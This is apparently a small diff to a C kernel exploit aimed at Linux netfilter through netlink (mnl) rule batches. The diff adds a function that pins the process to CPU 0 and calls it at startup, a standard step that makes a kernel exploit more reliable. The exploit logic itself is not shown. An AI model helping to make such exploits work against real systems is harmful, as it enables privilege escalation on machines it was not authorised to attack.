@@ -32,6 +32,16 @@ char pkt_message[512] = {0, };
 char pkt_buffer[512] = {0, };
 int pkt_port = 0;
 
+void init_cpu(void){
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    CPU_SET(0, &set);
+    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
+        perror("[-] sched_setaffinity");
+        exit(EXIT_FAILURE);    
+    }
+}
+
 void *sender_thread(void *arg) {
     int client_socket;
     struct sockaddr_in server_addr;
@@ -304,7 +314,8 @@ void add_rule_exploit(struct mnl_nlmsg_batch *b, int *seq, const char* table_nam
 int main(int argc, char *argv[])
 {
     printf("[+] exploit process starting\n");
-
+    
+    init_cpu();
     init_namespace();
 
     struct mnl_socket *nl;
